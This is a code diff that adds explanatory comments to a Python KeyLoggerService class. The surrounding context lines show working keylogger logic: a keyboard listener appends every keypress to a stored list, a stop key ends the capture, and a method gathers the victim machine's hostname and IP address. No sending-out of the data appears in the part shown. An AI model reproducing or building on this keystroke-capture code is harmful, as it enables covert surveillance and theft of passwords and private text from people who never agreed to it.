@@ -11,6 +11,7 @@ class KeyLoggerService(IKeyLogger):
         self.listener = None
         self.info = {}
 
+    # makes keys readable and arranges words
     def on_press(self, key):
         self.key_str = str(key).replace("'", "")
         if self.key_str=='Key.shift':
@@ -61,18 +62,21 @@ class KeyLoggerService(IKeyLogger):
             self.key_str='9'
         self.data.append(self.key_str)
 
-
+    # starts the keylogger
     def start_logging(self) -> None:
         self.listener=Listener(on_press=self.on_press)
         self.listener.start()
 
+    # symbol that stops the keylogger
     def stop_logging(self) -> None:
         if self.key_str == "@":
             exit()
 
+    # returns list of all that was typed
     def get_logged_keys(self) -> list[str]:
         return self.data
 
+    # information about the device that data was taken
     def system_information(self):
         self.info['name'] = socket.gethostname()
         self.info['ip'] = socket.gethostbyname(self.info['name'])
